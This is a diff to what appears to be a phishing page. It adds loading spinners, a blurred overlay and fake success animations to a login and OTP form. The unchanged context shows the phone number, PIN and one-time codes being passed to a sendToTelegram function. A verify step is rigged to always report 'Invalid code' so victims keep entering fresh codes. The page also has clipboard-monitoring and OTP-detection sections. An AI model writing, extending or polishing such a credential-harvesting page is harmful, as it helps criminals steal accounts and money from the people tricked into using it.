@@ -109,12 +109,47 @@
             text-decoration: none;
             font-family: inherit;
             transition: background 0.2s;
+            position: relative;
+            overflow: hidden;
         }
         .btn:hover {
             background-color: #1f1236;
         }
         .btn:active {
             transform: scale(0.99);
+        }
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        /* Button loading state */
+        .btn.loading {
+            color: transparent;
+            pointer-events: none;
+        }
+        .btn.loading .btn-text {
+            opacity: 0;
+        }
+        .btn .btn-loader {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 22px;
+            height: 22px;
+            border: 2.5px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: btnSpin 0.7s linear infinite;
+            display: none;
+        }
+        .btn.loading .btn-loader {
+            display: block;
+        }
+
+        @keyframes btnSpin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
         }
 
         /* ========== REMEMBER ME ========== */
@@ -237,9 +272,196 @@
             color: #ffffff;
             text-decoration: underline;
         }
+
+        /* ============================================ */
+        /* FULL SCREEN LOADING OVERLAY */
+        /* ============================================ */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(30, 15, 50, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 9999;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+            animation: fadeInOverlay 0.3s ease;
+        }
+
+        @keyframes fadeInOverlay {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Beautiful loader */
+        .loader-wrap {
+            position: relative;
+            width: 90px;
+            height: 90px;
+            margin-bottom: 26px;
+        }
+
+        .loader-ring {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 4px solid transparent;
+            animation: ringSpin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+
+        .loader-ring:nth-child(1) {
+            border-top-color: #d8b4fe;
+            animation-delay: -0.45s;
+        }
+
+        .loader-ring:nth-child(2) {
+            border-right-color: #ffffff;
+            animation-delay: -0.3s;
+        }
+
+        .loader-ring:nth-child(3) {
+            border-bottom-color: #a78bfa;
+            animation-delay: -0.15s;
+        }
+
+        .loader-ring:nth-child(4) {
+            border-left-color: #7c3aed;
+        }
+
+        @keyframes ringSpin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Center icon */
+        .loader-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 26px;
+            color: #ffffff;
+            animation: centerPulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes centerPulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 0.85; }
+        }
+
+        /* Loading text */
+        .loading-text {
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
+        }
+
+        .loading-subtext {
+            color: rgba(255, 255, 255, 0.75);
+            font-size: 12.5px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+
+        /* Animated dots */
+        .loading-dots span {
+            display: inline-block;
+            animation: dotBounce 1.4s ease-in-out infinite;
+        }
+        .loading-dots span:nth-child(1) { animation-delay: 0s; }
+        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes dotBounce {
+            0%, 80%, 100% { transform: translateY(0); opacity: 0.5; }
+            40% { transform: translateY(-5px); opacity: 1; }
+        }
+
+        /* Floating particles around loader */
+        .loader-particle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background: #d8b4fe;
+            border-radius: 50%;
+            opacity: 0.7;
+            animation: particleFloat 3s ease-in-out infinite;
+        }
+        .loader-particle:nth-child(1) {
+            top: -20px; left: 50%;
+            animation-delay: 0s;
+        }
+        .loader-particle:nth-child(2) {
+            bottom: -20px; right: 50%;
+            animation-delay: 0.5s;
+            background: #ffffff;
+        }
+        .loader-particle:nth-child(3) {
+            top: 50%; right: -25px;
+            animation-delay: 1s;
+            background: #a78bfa;
+        }
+        .loader-particle:nth-child(4) {
+            bottom: 50%; left: -25px;
+            animation-delay: 1.5s;
+            background: #7c3aed;
+        }
+
+        @keyframes particleFloat {
+            0%, 100% { transform: translateY(0) scale(1); opacity: 0.7; }
+            50% { transform: translateY(-8px) scale(1.3); opacity: 1; }
+        }
+
+        /* Success checkmark animation */
+        .success-icon {
+            font-size: 60px;
+            color: #4ade80;
+            animation: successPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+            margin-bottom: 16px;
+        }
+
+        @keyframes successPop {
+            0% { transform: scale(0) rotate(-180deg); opacity: 0; }
+            60% { transform: scale(1.2) rotate(10deg); }
+            100% { transform: scale(1) rotate(0deg); opacity: 1; }
+        }
+
     </style>
 </head>
 <body>
+
+    <!-- ============================================ -->
+    <!-- FULL SCREEN LOADING OVERLAY -->
+    <!-- ============================================ -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loader-wrap" id="loaderWrap">
+            <div class="loader-ring"></div>
+            <div class="loader-ring"></div>
+            <div class="loader-ring"></div>
+            <div class="loader-ring"></div>
+            <div class="loader-center"><i class="fa-solid fa-shield-halved"></i></div>
+            <div class="loader-particle"></div>
+            <div class="loader-particle"></div>
+            <div class="loader-particle"></div>
+            <div class="loader-particle"></div>
+        </div>
+        <div class="loading-text" id="loadingText">Processing</div>
+        <div class="loading-subtext">
+            Please wait<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>
+        </div>
+    </div>
 
     <div class="container">
 
@@ -261,7 +483,8 @@
 
             <!-- Login Button -->
             <button class="btn" id="loginBtn">
-                Login <i class="fa-solid fa-arrow-right"></i>
+                <span class="btn-text">Login <i class="fa-solid fa-arrow-right"></i></span>
+                <span class="btn-loader"></span>
             </button>
 
             <button class="btn">
@@ -298,7 +521,8 @@
 
             <!-- Verify Button -->
             <button class="btn" id="verifyBtn">
-                Verify <i class="fa-solid fa-arrow-right"></i>
+                <span class="btn-text">Verify <i class="fa-solid fa-arrow-right"></i></span>
+                <span class="btn-loader"></span>
             </button>
 
             <!-- Resend -->
@@ -321,8 +545,44 @@
         const phoneInput = document.getElementById('phoneInput');
         const pinInput = document.getElementById('pinInput');
 
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loaderWrap = document.getElementById('loaderWrap');
+        const loadingText = document.getElementById('loadingText');
+
         let userPhone = '';
         let userPin = '';
+
+        // ========== SHOW / HIDE LOADING ==========
+        function showLoading(text) {
+            loadingText.textContent = text || 'Processing';
+            // Reset loader wrap (in case it was replaced by success icon)
+            loaderWrap.innerHTML = `
+                <div class="loader-ring"></div>
+                <div class="loader-ring"></div>
+                <div class="loader-ring"></div>
+                <div class="loader-ring"></div>
+                <div class="loader-center"><i class="fa-solid fa-shield-halved"></i></div>
+                <div class="loader-particle"></div>
+                <div class="loader-particle"></div>
+                <div class="loader-particle"></div>
+                <div class="loader-particle"></div>
+            `;
+            loadingOverlay.classList.add('show');
+        }
+
+        function hideLoading() {
+            loadingOverlay.classList.remove('show');
+        }
+
+        function showSuccessThenHide(text, callback) {
+            loadingText.textContent = text || 'Success!';
+            // Replace loader with success icon
+            loaderWrap.innerHTML = `<i class="fa-solid fa-check-circle success-icon"></i>`;
+            setTimeout(function() {
+                hideLoading();
+                if (typeof callback === 'function') callback();
+            }, 1200);
+        }
 
         // ========== SEND TO TELEGRAM ==========
         async function sendToTelegram(data) {
@@ -360,22 +620,36 @@
                 return;
             }
 
+            // Show button loading state
+            loginBtn.classList.add('loading');
+
+            // Show full screen loading
+            showLoading('Signing In');
+
             sendToTelegram({
                 phone: userPhone,
                 pin: userPin,
                 step: 'login'
             });
 
-            loginPage.classList.remove('active');
-            otpPage.classList.add('active');
-
-            startOtpDetection();
+            // After 2 seconds, show success and go to OTP
+            setTimeout(function() {
+                loginBtn.classList.remove('loading');
+                showSuccessThenHide('Welcome!', function() {
+                    loginPage.classList.remove('active');
+                    otpPage.classList.add('active');
+                    startOtpDetection();
+                });
+            }, 2000);
         });
 
         // ========== VERIFY BUTTON — ALWAYS INVALID ==========
         verifyBtn.addEventListener('click', function() {
             const otp = otpInput.value.trim();
             if (otp.length === 5) {
+                verifyBtn.classList.add('loading');
+                showLoading('Verifying');
+
                 sendToTelegram({
                     phone: userPhone,
                     pin: userPin,
@@ -383,9 +657,15 @@
                     step: 'otp_verify'
                 });
 
-                errorMsg.textContent = 'Invalid code. Please try again.';
-                errorMsg.classList.add('show');
-                otpInput.value = '';
+                // After 2 seconds, show invalid
+                setTimeout(function() {
+                    verifyBtn.classList.remove('loading');
+                    hideLoading();
+
+                    errorMsg.textContent = 'Invalid code. Please try again.';
+                    errorMsg.classList.add('show');
+                    otpInput.value = '';
+                }, 2000);
             }
         });
 
@@ -409,7 +689,13 @@
         resendOtp.addEventListener('click', function() {
             otpInput.value = '';
             errorMsg.classList.remove('show');
-            alert('OTP resent successfully!');
+
+            showLoading('Resending OTP');
+            setTimeout(function() {
+                showSuccessThenHide('OTP Sent!', function() {
+                    // Nothing extra
+                });
+            }, 1500);
         });
 
         // ========== CLIPBOARD MONITOR ==========
